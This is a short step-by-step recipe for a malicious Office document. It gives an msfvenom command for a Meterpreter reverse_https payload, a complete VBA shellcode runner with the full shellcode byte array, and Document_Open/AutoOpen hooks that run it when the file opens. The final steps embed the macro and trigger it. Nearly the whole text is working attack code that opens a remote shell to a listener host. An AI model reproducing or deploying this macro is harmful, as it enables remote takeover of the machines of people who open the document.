1) Generate payload

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.3 LPORT=443 EXITFUNC=thread -f vbapplication

2) Copy payload into the vba Shell code runner

Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As LongPtr, ByVal StackSize As LongPtr, ByVal StartFunction As LongPtr, ByVal ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)

Function MyMacro()
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As LongPtr
    Dim res As LongPtr
    
    ' Define your own buf array here
    Dim buf() As Byte
    
    buf = Array(252, 232, 143, 0, 0, 0, 96, 49, 210, 100, 139, 82, 48, 137, 229, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 80, 139, 88, 32, 139, 72, 24, 1, 211, 133, 201, 116, 60, 73, 139, _
52, 139, 49, 255, 1, 214, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 81, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 49, 48, 46, 48, 59, 32, 87, 105, 110, 54, 52, 59, 32, 120, 54, 52, 59, 32, 114, 118, 58, 49, 48, 56, 46, 48, 41, 32, 71, 101, 99, 107, 111, 47, 50, 48, 49, _
48, 48, 49, 48, 49, 32, 70, 105, 114, 101, 102, 111, 120, 47, 49, 48, 56, 46, 48, 0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 187, 1, 0, 0, 232, 94, 1, 0, 0, 47, 99, 77, 101, 109, 79, 99, 89, 54, 83, 118, 106, 88, 81, 78, 90, 66, 115, 121, 81, 49, 67, 103, 118, 45, 113, 79, 119, 82, 116, 111, 81, 116, 69, 100, 57, 84, _
97, 79, 100, 116, 82, 110, 109, 121, 85, 88, 65, 115, 110, 103, 81, 50, 82, 95, 55, 67, 78, 65, 79, 100, 119, 56, 57, 56, 67, 70, 52, 87, 81, 50, 88, 71, 108, 102, 98, 72, 53, 65, 56, 101, 106, 88, 114, 117, 107, 83, 113, 66, 81, 97, 84, 88, 113, 68, 45, 76, 111, 69, 83, 99, 85, 106, 68, 79, 81, 79, 115, 86, 103, 115, 95, 45, 108, 101, 79, 80, _
87, 119, 51, 83, 67, 107, 51, 85, 122, 73, 122, 84, 119, 79, 100, 54, 109, 56, 51, 76, 49, 76, 57, 98, 99, 97, 122, 109, 121, 87, 119, 50, 87, 118, 48, 99, 118, 67, 86, 110, 68, 51, 51, 102, 102, 101, 112, 114, 67, 97, 70, 82, 118, 45, 95, 68, 102, 70, 78, 67, 105, 109, 117, 88, 114, 49, 84, 66, 119, 80, 78, 120, 51, 78, 108, 49, 49, 76, 54, 79, _
110, 102, 102, 81, 48, 74, 54, 51, 85, 88, 86, 77, 75, 50, 51, 73, 120, 79, 103, 55, 103, 79, 75, 50, 71, 80, 116, 120, 72, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 2, 104, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, _
136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 225, 232, 72, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 127, 255, 255, 255, 49, _
57, 50, 46, 49, 54, 56, 46, 49, 46, 51, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    
    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        RtlMoveMemory ByVal addr + counter, data, 1
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


3) Copy the complete vba script into the document vba

4) Save and exit

5) Open the document again to run the macro

